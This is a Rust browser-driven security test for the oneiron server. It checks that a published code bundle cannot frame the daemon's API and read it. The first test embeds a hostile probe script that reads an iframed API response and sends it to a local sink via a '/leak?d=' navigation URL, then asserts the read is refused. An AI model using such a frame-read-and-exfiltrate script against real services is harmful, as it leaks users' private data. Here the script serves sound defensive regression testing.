//! F02 (H103), in a real browser. A hostile code-bundle artifact opened as the
//! local daemon user frames an API response and sends what it read away by
//! navigation. On the daemon's origin a bundle's own scripts ran same-origin
//! with the API, so before its document was sandboxed the frame was readable.
//! The probe reports `read:` with what it read, `denied:` with the refusal it
//! observed (a frame-src violation or a cross-origin document), or `timeout`.
//! It runs on both origins the daemon serves bundles on: the API's, where the
//! bundle is sandboxed, and the artifact listener's, where it targets the
//! API's absolute URL.
//!
//! A bundle's module scripts and web fonts are fetched in CORS mode, so they
//! need the bundle to keep an origin of its own, which the artifact listener
//! gives it: the second probe reports `module:ok` once its module graph ran,
//! with whether its font loaded.
//!
//! Needs a headless Chrome: set `ONEIRON_E2E_CHROME` to its binary and run
//! `cargo test -p oneiron-server --test it -- --ignored artifact_origin_browser`.

use std::io::{Read, Write};
use std::net::{SocketAddr, TcpListener};
use std::sync::{Arc, Mutex};
use std::time::Duration;

use oneiron::{TimeRange, VaultConfig};
use oneiron_server::config::SyncServerConfig;
use oneiron_server::server::SyncServer;
use oneiron_server::{build_app, build_artifact_app};

const PROBE_FONT: &[u8] = include_bytes!("../fixtures/artifact/probe-font.ttf");

fn git(repo: &std::path::Path, args: &[&str]) {
    let status = std::process::Command::new("git")
        .args(args)
        .current_dir(repo)
        .stdout(std::process::Stdio::null())
        .stderr(std::process::Stdio::null())
        .status()
        .expect("git starts");
    assert!(status.success(), "git {args:?} failed");
}

/// A sink on another origin that records the paths the browser asks for.
fn spawn_sink() -> (u16, Arc<Mutex<Vec<String>>>) {
    let listener = TcpListener::bind("127.0.0.1:0").expect("bind sink");
    let port = listener.local_addr().expect("sink addr").port();
    let seen = Arc::new(Mutex::new(Vec::new()));
    let record = Arc::clone(&seen);
    std::thread::spawn(move || {
        for stream in listener.incoming() {
            let Ok(mut stream) = stream else { continue };
            let mut buffer = [0_u8; 8192];
            let read = stream.read(&mut buffer).unwrap_or(0);
            let request = String::from_utf8_lossy(&buffer[..read]).into_owned();
            if let Some(path) = request.split_whitespace().nth(1) {
                record.lock().expect("sink log").push(path.to_owned());
            }
            let _ = stream.write_all(
                b"HTTP/1.1 200 OK\r\ncontent-type: text/plain\r\ncontent-length: 2\r\nconnection: close\r\n\r\nok",
            );
        }
    });
    (port, seen)
}

/// The raw, still percent-encoded values the sink saw under `/<kind>?d=`.
fn reports(sink: &Mutex<Vec<String>>, kind: &str) -> Vec<String> {
    let prefix = format!("/{kind}?d=");
    sink.lock()
        .expect("sink log")
        .iter()
        .filter_map(|path| path.strip_prefix(prefix.as_str()).map(str::to_owned))
        .collect()
}

/// Commits `files` to a fresh repository and publishes them as the public code
/// bundle `name`.
fn publish_bundle(vault: &oneiron::Vault, name: &str, files: &[(&str, &[u8])]) {
    let repo = tempfile::tempdir().expect("artifact repo");
    for (path, bytes) in files {
        std::fs::write(repo.path().join(path), bytes).expect("write bundle file");
    }
    git(repo.path(), &["init"]);
    git(
        repo.path(),
        &["config", "user.email", "oneiron@example.test"],
    );
    git(repo.path(), &["config", "user.name", "Oneiron Test"]);
    git(repo.path(), &["add", "."]);
    git(repo.path(), &["commit", "-m", "bundle"]);
    let ingest =
        oneiron::codebase::RepoIngestConfig::new(repo.path(), files.iter().map(|(path, _)| *path))
            .expect("ingest config");
    let result = vault
        .ingest_local_repo_at_commit(name, &ingest, "HEAD", TimeRange { start: 10, end: 10 }, 10)
        .expect("ingest bundle");
    let body = vault
        .get_code_artifact(&result.code_artifact_id)
        .expect("read code artifact")
        .expect("code artifact exists")
        .with_class(oneiron::code_artifact::CodeArtifactClass::Artifact);
    vault
        .put_code_artifact(
            &result.code_artifact_id,
            &body,
            TimeRange { start: 10, end: 10 },
            10,
        )
        .expect("mark hostable");
    vault
        .publish_artifact_pointer_with_tier(
            name,
            oneiron::ArtifactPointerChannel::Published,
            &result.snapshot.fork_hash,
            oneiron::artifact_hosting::ArtifactServeTier::Public,
        )
        .expect("publish bundle");
}

/// A running unauthenticated dev daemon: the API's address, the artifact
/// listener's, and the vault directory they serve.
struct Daemon {
    api: SocketAddr,
    artifacts: SocketAddr,
    _vault_dir: tempfile::TempDir,
}

/// Serves a fresh vault on two listeners, as ordinary serve does: the API,
/// and `/a/` alone on a port of its own. `fill` stocks the vault before
/// either serves, knowing the API's address. With no credential the API
/// answers a browser on its own origin, which is what makes a same-origin
/// read pay.
async fn spawn_daemon(fill: impl FnOnce(&oneiron::Vault, SocketAddr)) -> Daemon {
    let api_listener = tokio::net::TcpListener::bind("127.0.0.1:0")
        .await
        .expect("bind daemon");
    let artifact_listener = tokio::net::TcpListener::bind("127.0.0.1:0")
        .await
        .expect("bind artifact listener");
    let api = api_listener.local_addr().expect("daemon addr");
    let artifacts = artifact_listener.local_addr().expect("artifact addr");
    let vault_dir = tempfile::tempdir().expect("vault dir");
    let mut vault_config = VaultConfig::device();
    vault_config.map_size = 64 * 1024 * 1024;
    let vault = Arc::new(oneiron::Vault::open(vault_dir.path(), vault_config).expect("vault"));
    fill(&vault, api);
    let server = Arc::new(
        SyncServer::new(
            vault,
            SyncServerConfig {
                allow_unauthenticated: true,
                ..Default::default()
            },
        )
        .expect("server")
        .with_artifact_listener(artifacts.port()),
    );
    let artifact_app = build_artifact_app(server.clone());
    let app = build_app(server);
    tokio::spawn(async move {
        axum::serve(api_listener, app).await.expect("serve");
    });
    tokio::spawn(async move {
        axum::serve(artifact_listener, artifact_app)
            .await
            .expect("serve artifacts");
    });
    Daemon {
        api,
        artifacts,
        _vault_dir: vault_dir,
    }
}

/// Opens `url` in a fresh headless Chrome and waits for it to finish.
async fn open_in_chrome(url: &str) {
    let chrome = std::env::var("ONEIRON_E2E_CHROME")
        .expect("set ONEIRON_E2E_CHROME to a headless Chrome binary");
    let profile = tempfile::tempdir().expect("chrome profile");
    let mut browser = tokio::process::Command::new(chrome)
        .args([
            "--headless=new",
            "--no-sandbox",
            "--disable-gpu",
            "--no-first-run",
            "--no-default-browser-check",
            "--virtual-time-budget=10000",
            "--dump-dom",
        ])
        .arg(format!("--user-data-dir={}", profile.path().display()))
        .arg(url)
        .stdout(std::process::Stdio::null())
        .stderr(std::process::Stdio::null())
        .kill_on_drop(true)
        .spawn()
        .expect("start chrome");
    let finished = tokio::time::timeout(Duration::from_secs(90), browser.wait()).await;
    assert!(finished.is_ok(), "chrome did not finish");
}

#[ignore = "requires a headless Chrome named by ONEIRON_E2E_CHROME"]
#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn a_code_artifact_cannot_read_the_api_through_a_frame_and_send_it_away() {
    let (sink_port, sink) = spawn_sink();

    // The page frames an API response by its absolute URL and navigates to
    // the sink with whatever it could read, or with why it could not.
    let target = oneiron::EntityId::now().to_hex();
    let daemon = spawn_daemon(|vault, api| {
        let probe = format!(
            "let sent = false;\n\
             function send(text) {{ if (sent) return; sent = true; \
             location.href = 'http://127.0.0.1:{sink_port}/leak?d=' + encodeURIComponent(text); }}\n\
             document.addEventListener('securitypolicyviolation', (event) => {{ \
             if (event.violatedDirective.startsWith('frame-src')) send('denied:frame-src'); }});\n\
             const frame = document.createElement('iframe');\n\
             frame.onload = () => {{ let page; \
             try {{ page = frame.contentDocument; }} \
             catch (error) {{ send(error.name === 'SecurityError' ? 'denied:SecurityError' : 'error:' + error.name); return; }} \
             send(page === null ? 'denied:cross-origin' : 'read:' + page.body.innerText); }};\n\
             frame.src = 'http://{api}/api/entity/{target}';\n\
             document.body.appendChild(frame);\n\
             setTimeout(() => send('timeout'), 5000);\n"
        );
        publish_bundle(
            vault,
            "hostile",
            &[
                (
                    "index.html",
                    b"<!doctype html><html><body><script src=\"probe.js\"></script></body></html>\n"
                        .as_slice(),
                ),
                ("probe.js", probe.as_bytes()),
            ],
        );
    })
    .await;

    for (runs, origin) in [(1, daemon.api), (2, daemon.artifacts)] {
        open_in_chrome(&format!("http://{origin}/a/hostile/_s/c/published/")).await;
        let leaks = reports(&sink, "leak");
        assert_eq!(
            leaks.len(),
            runs,
            "the bundle's own script runs and reports once on {origin}: {leaks:?}"
        );
        let report = &leaks[runs - 1];
        eprintln!("browser report on {origin}: {report}");
        // Only an observed refusal counts: a timeout or a probe error fails.
        assert!(
            report.starts_with("denied"),
            "the bundle's frame read on {origin} was not refused: {report}"
        );
    }
}

/// A bundle whose page loads a stylesheet with an `@font-face`, a classic
/// watchdog script and a module that imports a sibling module, which waits for
/// the page to load and then for the font. Whatever happens first goes to the
/// sink under `/report`.
fn module_and_font_bundle(sink_port: u16) -> Vec<(&'static str, Vec<u8>)> {
    vec![
        (
            "index.html",
            b"<!doctype html><html><head>\
              <link rel=\"stylesheet\" href=\"style.css\">\
              <script src=\"watch.js\"></script>\
              <script type=\"module\" src=\"main.js\"></script>\
              </head><body>A</body></html>\n"
                .to_vec(),
        ),
        (
            "style.css",
            b"@font-face { font-family: OneironProbe; src: url(probe-font.ttf); }\n\
              body { font-family: OneironProbe, monospace; }\n"
                .to_vec(),
        ),
        (
            "watch.js",
            format!(
                "window.report = (text) => {{ if (window.reported) return; window.reported = true; \
                 location.href = 'http://127.0.0.1:{sink_port}/report?d=' + encodeURIComponent(text); }};\n\
                 setTimeout(() => window.report('timeout'), 5000);\n"
            )
            .into_bytes(),
        ),
        (
            "main.js",
            b"import { fontState } from './dep.js';\n\
              fontState().then((font) => window.report('module:ok ' + font));\n"
                .to_vec(),
        ),
        (
            "dep.js",
            b"export async function fontState() {\n\
              if (document.readyState !== 'complete') {\n\
              await new Promise((done) => window.addEventListener('load', done, { once: true }));\n\
              }\n\
              try {\n\
              const faces = await document.fonts.load('16px OneironProbe');\n\
              return faces.length > 0 && faces.every((face) => face.status === 'loaded')\n\
              ? 'font:loaded' : 'font:missing';\n\
              } catch (error) { return 'font:' + error.name; }\n\
              }\n"
                .to_vec(),
        ),
        ("probe-font.ttf", PROBE_FONT.to_vec()),
    ]
}

#[ignore = "requires a headless Chrome named by ONEIRON_E2E_CHROME"]
#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn a_code_bundle_runs_its_module_scripts_and_loads_its_fonts_on_the_artifact_origin() {
    let (sink_port, sink) = spawn_sink();
    let files = module_and_font_bundle(sink_port);
    let daemon = spawn_daemon(|vault, _| {
        let files: Vec<(&str, &[u8])> = files
            .iter()
            .map(|(path, bytes)| (*path, bytes.as_slice()))
            .collect();
        publish_bundle(vault, "fonts", &files);
    })
    .await;

    open_in_chrome(&format!(
        "http://{}/a/fonts/_s/c/published/",
        daemon.artifacts
    ))
    .await;

    let seen = reports(&sink, "report");
    eprintln!("browser report: {seen:?}");
    assert_eq!(
        seen,
        ["module%3Aok%20font%3Aloaded"],
        "the bundle's module graph ran and its font loaded"
    );
}
